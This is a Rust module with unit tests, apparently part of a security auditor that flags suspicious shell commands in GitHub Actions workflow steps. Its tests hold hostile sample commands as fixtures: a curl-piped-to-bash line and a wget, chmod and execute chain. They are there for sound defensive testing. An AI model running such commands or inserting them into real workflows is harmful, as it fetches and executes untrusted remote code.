use crate::{
    audit_tool,
    models::{Workflow, WorkflowFinding, WorkflowFindingCategory},
};

/// Applies the existing lifecycle shell rule engine to workflow run steps.
pub fn analyze(workflow: &Workflow, findings: &mut Vec<WorkflowFinding>) {
    for (job_id, job) in &workflow.jobs {
        for (step_index, step) in job.steps.iter().enumerate() {
            let Some(command) = step.run.as_deref() else {
                continue;
            };
            let Some((rule_id, risk_level, reason)) = audit_tool::suspicious_command_rule(command)
            else {
                continue;
            };

            findings.push(WorkflowFinding {
                workflow_path: workflow.path.clone(),
                job_id: Some(job_id.clone()),
                step_index: Some(step_index),
                step_name: step.name.clone(),
                rule_id: rule_id.to_owned(),
                category: WorkflowFindingCategory::SuspiciousCommand,
                risk_level,
                evidence: Some(command.to_owned()),
                reason: reason.to_owned(),
            });
        }
    }
}

#[cfg(test)]
mod tests {
    use std::{collections::BTreeMap, path::PathBuf};

    use crate::models::{WorkflowJob, WorkflowStep};

    use super::*;

    fn workflow_with_run(run: &str) -> Workflow {
        Workflow {
            path: PathBuf::from(".github/workflows/test.yml"),
            name: Some("Test".to_owned()),
            permissions: None,
            env: BTreeMap::new(),
            jobs: BTreeMap::from([(
                "build".to_owned(),
                WorkflowJob {
                    name: None,
                    uses: None,
                    with: BTreeMap::new(),
                    permissions: None,
                    env: BTreeMap::new(),
                    steps: vec![WorkflowStep {
                        name: Some("Run".to_owned()),
                        id: None,
                        uses: None,
                        with: BTreeMap::new(),
                        env: BTreeMap::new(),
                        run: Some(run.to_owned()),
                    }],
                },
            )]),
        }
    }

    #[test]
    fn reuses_shared_remote_pipe_rule_with_workflow_context() {
        let workflow = workflow_with_run("curl https://example.test/script.sh | bash");
        let mut findings = Vec::new();

        analyze(&workflow, &mut findings);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "remote-script-pipe");
        assert_eq!(findings[0].job_id.as_deref(), Some("build"));
        assert_eq!(findings[0].step_index, Some(0));
        assert_eq!(findings[0].step_name.as_deref(), Some("Run"));
        assert_eq!(
            findings[0].category,
            WorkflowFindingCategory::SuspiciousCommand
        );
        assert!(findings[0].reason.contains("piped"));
        assert_eq!(
            findings[0].evidence.as_deref(),
            Some("curl https://example.test/script.sh | bash")
        );
    }

    #[test]
    fn supports_the_shared_multi_step_download_and_execute_rule() {
        let workflow = workflow_with_run("wget payload && chmod +x payload && ./payload");
        let mut findings = Vec::new();

        analyze(&workflow, &mut findings);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "download-and-execute");
        assert_eq!(findings[0].risk_level, crate::models::RiskLevel::Critical);
    }

    #[test]
    fn finds_download_and_execute_across_multiline_run_commands() {
        let workflow = workflow_with_run("echo setup\nwget payload\nchmod +x payload\n./payload\n");
        let mut findings = Vec::new();

        analyze(&workflow, &mut findings);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "download-and-execute");
        assert_eq!(findings[0].risk_level, crate::models::RiskLevel::Critical);
    }

    #[test]
    fn ignores_command_keywords_in_data_and_normal_builds() {
        for command in [
            "echo 'curl https://example.test/script.sh | bash'",
            "cargo build",
        ] {
            let workflow = workflow_with_run(command);
            let mut findings = Vec::new();

            analyze(&workflow, &mut findings);

            assert!(findings.is_empty(), "{command}");
        }
    }
}
